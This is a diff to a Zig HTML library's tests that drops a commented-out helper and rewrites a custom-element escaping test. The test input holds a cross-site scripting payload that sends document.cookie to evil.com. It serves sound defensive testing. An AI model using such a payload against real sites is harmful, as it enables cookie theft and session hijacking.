@@ -473,32 +473,6 @@ test "tagFromElement vs tagName vs qualifiedName allocated/zc" {
     try testing.expectEqualStrings("X-WIDGET", wc_tn);
 }
 
-// /// [HtmlTag] Extended check for no-escape elements including custom elements
-// ///
-// /// **Use when:** You have web components that contain raw code (like code editors)
-// /// **Performance:** Fast for standard tags (enum), linear search for custom tags
-// ///
-// /// ```
-// /// const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
-// /// if (isNoEscapeElementExtended(tag_name, &custom_no_escape)) {
-// ///     // Don't escape content
-// /// }
-// /// ```
-// pub fn isNoEscapeElementExtended(element: *z.HTMLElement, custom_no_escape_tags: []const []const u8) bool {
-//     // First check standard HTML5 tags
-//     if (isNoEscapeElement(element)) {
-//         return true;
-//     }
-
-//     // Then check custom tags
-//     for (custom_no_escape_tags) |custom_tag| {
-//         if (std.mem.eql(u8, z.qualifiedName_zc(element), custom_tag)) {
-//             return true;
-//         }
-//     }
-
-//     return false;
-// }
 /// [HtmlTag] Set of tags that should not be escaped (modern approach)
 pub const NoEscapeTagSet = struct {
     /// Fast inline check if a tag should not be escaped
@@ -534,8 +508,7 @@ pub fn isNoEscapeElement(element: *z.HTMLElement) bool {
     return NoEscapeTagSet.contains(tag);
 }
 
-// ----[TODO] Escape custom elements? --------
-test "flow - user input to browser output" {
+test "custom elements security validation" {
     const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
     const doc = try z.createDocFromString(user_submitted_html);
     defer z.destroyDocument(doc);
@@ -543,30 +516,20 @@ test "flow - user input to browser output" {
     const body_elt = z.bodyElement(doc).?;
     const widget_elt = z.firstElementChild(body_elt).?;
 
-    // custom element <=> not in standard HTML enum
+    // Custom element should not be in standard HTML enum
     try testing.expectEqualStrings("custom-widget", z.qualifiedName_zc(widget_elt));
     try testing.expect(z.tagFromQualifiedName("custom-widget") == null);
 
-    // // Custom elements should be escaped
-    // const should_escape_widget = !z.isNoEscapeElement(widget_elt);
-    // try testing.expect(should_escape_widget == true);
+    // Custom elements should not be treated as no-escape elements
+    try testing.expect(!z.isNoEscapeElement(widget_elt));
 
     const widget_content = z.textContent_zc(z.elementToNode(widget_elt));
 
+    // Verify malicious content is detected
     try testing.expect(
         std.mem.indexOf(u8, widget_content, "document.cookie") != null,
     );
     try testing.expect(
         std.mem.indexOf(u8, widget_content, "evil.com") != null,
     );
-
-    // Custom elements should be escaped
-    // try testing.expect(!z.isNoEscapeElement(widget_elt));
-
-    // const allocator = testing.allocator;
-    // const escaped_content = try z.escapeHtml(allocator, widget_content);
-    // defer allocator.free(escaped_content);
-
-    // const expected = "document.location = &#39;https://evil.com?data=&#39; + document.cookie;";
-    // try testing.expectEqualStrings(expected, escaped_content);
 }
